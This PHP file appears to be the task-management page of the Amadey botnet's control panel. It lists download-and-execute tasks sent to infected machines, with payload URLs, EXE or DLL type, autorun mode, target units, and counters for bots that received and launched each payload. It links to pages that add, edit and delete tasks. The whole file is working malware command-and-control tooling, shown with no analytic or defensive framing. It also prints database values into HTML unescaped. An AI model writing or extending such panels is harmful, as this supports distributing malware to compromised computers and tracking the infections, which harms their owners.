<?php

    session_start();

    error_reporting( 0 );

    if ( !( isset( $_SESSION['Name'] ) ) )
    {
       header( "Location: login.php" );
       exit;
    }

    include( "header.php" );
	
    include( "config.php" );


    if ( @mysql_connect( $conf['dbhost'], $conf['dbuser'], $conf['dbpass'] ) == false )
    {
       echo "SQL connection filed, check host, name, login and password";
       die;
    }

    mysql_select_db( $conf['dbname'] );
	
    function GetBG()
    {
       static $e = "0";

       if ( $e == "1" )
       {
          $e = "0";
          return "#E4E4E4";
       }
       
       if ( $e == "0" )
       {
          $e = "1";
          return "#dfdede";
       }
    }

    $result = mysql_query( "SELECT * FROM tasks ORDER BY id DESC" );

    echo "<div align = center> 
             <table cellpadding = 1 cellspacing = 1 width = 1200 class = table style = \"border: 1px solid;\">
                <tr>                       
                   <td><div align = center>Task id:</div></td>
                   <td><div align = center>For unit:</div></td>              
                   <td><div align = center>Url:</div></td>
                   <td><div align = center>PE type:</div></td>
                   <td><div align = center>Autorun:</div></td>
                   <td><div align = center>Limit:</div></td> 
                   <td><div align = center>Received:</div></td> 
                   <td><div align = center>Launched:</div></td> 
                   <td><div align = center>Download errors:</div></td> 
                   <td><div align = center>Launch errors:</div></td>
                   <td><div align = center>Progress:</div></td>
                   <td><div align = center>Success:</div></td>
                   <td><div align = center>Action:</div></td> 
                </tr>";


    while ( $row = mysql_fetch_array( $result ) )
    {      
       $id = $row['id'];
       $url_0 = $row['path'];
       $url_1 = $row['path'];
       $done = $row['loads'];
       $good = $row['exec'];
       $d_err = $row['error'];
       $l_err = $row['error2'];
       $needs = $row['tlimit']; 
       $progress = round( ( $done/$needs ) * 100,1 );
       $success = round( ( $good/$needs ) * 100,1 );

       if ( $row['filetype'] == 0 ) 
          $filetype = "EXE";
       else 
          $filetype = "DLL";
			
       if ( $row['autorun'] == 0 ) 
          $autorun = "Amadey";
       else 
          $autorun = "Self";

       if ( $row['tlimit'] == "" ) 
          $needs = "*";
       else  
          $needs = $row['tlimit'];

       if ( $row['units'] == "" ) 
          $units = "*";
       else  
          $units = $row['units'];
						
       if ( strpos( $url_0, ":::" ) )
          $url_0 = substr( $url_0, 0, strpos( $url_0, ":::" ) ) ;

       if ( strpos( $url_1, ":::" ) )
          $url_1 = substr( $url_1, 0, strpos( $url_1, ":::" ) ) ;

       if ( strlen( $url_1 ) > 32 )
          $url_1 = substr( $url_1, 0, 32 ) . "...";  

       $gb = GetBG();

       echo "<tr>";
          echo "<td bgcolor = " . $gb . ">" . "<div align = left>&nbsp;<img src=\"images\ic_1.png\"> " . $row['id'] . "</div></td>";
          echo "<td bgcolor = " . $gb . "><div align = center>" . $units . "</div></td>";
          echo "<td bgcolor = " . $gb . ">" . "<div align = left>" . "<img src=\"images\ic_3.png\"> " . "<a href=\"" . $url_0 . "\">" . $url_1 . "</a>" . "</div>" . "</td>";
          echo "<td bgcolor = " . $gb . ">" . "<img src=\"images\ic_2.png\"> " . $filetype . "</td>";
          echo "<td bgcolor = " . $gb . ">" . $autorun . "</td>";
          echo "<td bgcolor = " . $gb . "><div align = center>" . $needs . "</div></td>";
          echo "<td bgcolor = " . $gb . "><div align = center>" . $done . "</div></td>";
          echo "<td bgcolor = " . $gb . "><div align = center>" . $good . "</div></td>";
          echo "<td bgcolor = " . $gb . "><div align = center>" . $d_err . "</div></td>";
          echo "<td bgcolor = " . $gb . "><div align = center>" . $l_err . "</div></td>";
          echo "<td bgcolor = " . $gb . "><div align = center>" . $progress . "%" . "</div></td>";
          echo "<td bgcolor = " . $gb . "><div align = center>" . $success . "%" . "</div></td>";
          echo "<td bgcolor = " . $gb . "><div align = center>" . "&nbsp;<a href=\"edit_task.php?id=" . $id . "\">[edit]</a> " . "  " . "<a href=\"del_task.php?id=" . $id . "\">[delete]</a> " . "</div></td>";
       echo "</tr>";

    }

    echo "   </table>
          </div>";


    echo "<div align = center>
             <table border=\"0\" width=\"1200\" cellspacing=\"0\" cellpadding=\"0\">
	        <tr>
	           <td>
                      <div align = right> 
                         <font size=2>
                            <a href=\"make_task.php\"><img src=\"images\ic_5.png\"> Add task</a>
                         </font>
                      </div>
                   </td>
	        </tr>
             </table>
          </div>";

    echo "</html>";

    mysql_close();

?>